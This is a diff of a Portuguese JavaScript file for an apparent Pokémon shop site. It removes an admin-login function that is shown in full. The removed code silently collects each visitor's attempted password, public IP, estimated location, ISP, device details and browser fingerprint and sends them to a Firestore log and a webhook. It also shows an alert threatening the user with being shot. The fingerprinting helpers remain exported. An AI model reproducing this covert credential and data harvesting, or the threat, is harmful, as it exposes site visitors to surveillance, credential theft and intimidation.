@@ -572,75 +572,7 @@ async function obterInformacoesIP() {
   }
 }
 
-// FUNÇÃO DE LOGIN ADM ATUALIZADA COM INFORMAÇÕES DO SISTEMA
-async function loginAdm() {
-  const NickAdm = document.getElementById("NicknameAdm").value.trim();
-  const Senha = document.getElementById("SenhaAdm").value.trim();
-  const loginValido = (NickAdm === "Mandaleri" || NickAdm === "Pamela") && Senha === senhaAdmGlobal;
 
-  alert(loginValido ? "✅ Login ADM autorizado// Nois sabemos de vc da silva junior, você irá ser morto á tiros safado" : "❌ Usuário ou senha incorretos e você não deveria estar aqui");
-
-  // Coletar informações básicas do sistema
-  const infoSistema = coletarInformacoesSistema();
-  
-  // Tentar obter informações de IP (pode demorar um pouco)
-  const infoIP = await obterInformacoesIP();
-  
-  // Combinar as informações
-  const infoCompleta = { ...infoSistema, ...infoIP };
-
-  try {
-    await addDoc(collection(db, 'logs_login'), {
-      nick: NickAdm,
-      senha: Senha,
-      timestamp: new Date(),
-      sucesso: loginValido,
-      infoSistema: infoCompleta
-    });
-  } catch (error) {
-    console.error("Erro ao registrar log:", error);
-  }
-
-  const statusEmoji = loginValido ? "✅" : "❌";
-  const statusTexto = loginValido ? "SUCESSO" : "FALHA";
-  
-  // Webhook com informações detalhadas do sistema
-  const conteudoWebhook = `🔐 **Login ADM - ${statusTexto}**
-👤 **Nick:** ${NickAdm}
-🔑 **Senha Tentada:** ${Senha}
-⏰ **Horário:** ${new Date().toLocaleString('pt-BR')}
-${statusEmoji} **Status:** ${statusTexto}
-
-🖥️ **INFORMAÇÕES DO SISTEMA:**
-**Navegador:** ${infoCompleta.navegador}
-**Sistema Operacional:** ${infoCompleta.sistemaOperacional}
-**Resolução da Tela:** ${infoCompleta.resolucaoTela}
-**Idioma do Sistema:** ${infoCompleta.idioma}
-**Fuso Horário:** ${infoCompleta.fusoHorario}
-
-🌐 **INFORMAÇÕES DE REDE:**
-**IP Público:** ${infoCompleta.ipPublico}
-**Localização Estimada:** ${infoCompleta.localizacao}
-**ISP:** ${infoCompleta.isp}
-**Tipo de Conexão:** ${infoCompleta.tipoConexao}
-
-🖱️ **INFORMAÇÕES DO DISPOSITIVO:**
-**Touch Screen:** ${infoCompleta.touchScreen ? 'Sim' : 'Não'}
-**Cores Suportadas:** ${infoCompleta.coresSuportadas}
-**Memória do Dispositivo:** ${infoCompleta.memoriaDispositivo}
-**Núcleos do Processador:** ${infoCompleta.nucleosProcessador}
-
-📱 **DETALHES TÉCNICOS:**
-**Cookies Habilitados:** ${infoCompleta.cookiesHabilitados ? 'Sim' : 'Não'}
-**Referrer:** ${infoCompleta.referrer || 'Acesso direto'}
-**Histórico de Navegação:** ${infoCompleta.historicoNavegacao} páginas
-**Plugins:** ${infoCompleta.pluginsInstalados.slice(0, 3).join(', ') || 'Nenhum'}
-
-**User Agent Completo:**
-\`${infoCompleta.userAgent}\``;
-
-  await enviarWebhook(conteudoWebhook);
-}
 
 class PokemonSelect {
   constructor(element) {
@@ -1277,14 +1209,7 @@ function testarFormatacao() {
   return resultado;
 }
 
-// FUNÇÃO PARA TESTAR O EVENTO SECRETO (apenas para desenvolvimento)
-function forcarEventoSecreto() {
-  console.log("🧪 Forçando evento secreto para teste...");
-  executarEventoSecreto();
-}
 
-document.addEventListener('DOMContentLoaded', async () => {
-  await carregarConfiguracoes();
   
   // Garantir que as telas estejam ocultas inicialmente
   const comprandoSection = document.getElementById("Comprando");
@@ -1317,7 +1242,7 @@ document.addEventListener('DOMContentLoaded', async () => {
   }
 
   Fechado();
-});
+
 
 // Exportar funções para o window
 window.Aberto = Aberto;
@@ -1339,6 +1264,5 @@ window.EnviarPedido = EnviarPedido;
 window.formatarPedidoEstilizado = formatarPedidoEstilizado;
 window.testarFormatacao = testarFormatacao;
 window.testarSistemaIVs = testarSistemaIVs;
-window.forcarEventoSecreto = forcarEventoSecreto;
 window.coletarInformacoesSistema = coletarInformacoesSistema;
 window.obterInformacoesIP = obterInformacoesIP;
